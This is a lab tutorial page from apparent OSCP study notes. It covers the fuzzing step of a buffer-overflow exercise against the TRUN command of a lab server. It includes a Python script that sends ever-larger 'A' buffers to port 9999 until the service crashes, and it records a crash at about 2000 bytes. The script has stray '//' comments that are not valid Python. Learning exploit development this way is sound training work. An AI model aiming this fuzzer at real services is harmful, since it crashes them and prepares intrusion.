---
metaLinks:
  alternates:
    - >-
      https://app.gitbook.com/s/qDX4NWkPelZggTpGCfyF/course-review/cyber-security-courses-journey/oscp-journey/ctf/buffer-overflow/bof-tcm/2-fuzzing
---

# 2- Fuzzing

**Fuzzing:** We are going to be sending a bunch of characters at a specific command and trying to break it. The different is, with spiking we're trying to do that to multiple commands to try to find what's vulnerable.

Now we know that the **TRUN** command is vulnerable, we're going to go ahead and attack that command specifically.

We need a built up the python script that we're going to use to Fuzz.

{% code title="1-payload.py" %}
```python
//python3 1-payload.py


#!/usr/bin/python3

import sys, socket
from time import sleep

buffer = "A" * 100

while True:
        try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                //Change This IP address and Port
                s.connect(('192.168.30.131',9999))

                payload = "TRUN /.:/" + buffer

                s.send((payload.encode()))
                s.close()
                sleep(1)
                buffer = buffer + "A"*100
        except:
                print ("Fuzzing crashed at %s bytes" % str(len(buffer)))
                sys.exit()
                
```
{% endcode %}

<figure><img src="../../../../../../.gitbook/assets/image (600).png" alt=""><figcaption></figcaption></figure>

Once we run the payload, keep notice that, at one point the Immunity debug will blink and alert **Access Violation**.

Once, the program crashed, we can go back to Kali machine and hit Ctrl + C. We found that program crashed somewhere around **2000 bytes.**

<figure><img src="../../../../../../.gitbook/assets/image (239).png" alt=""><figcaption></figcaption></figure>

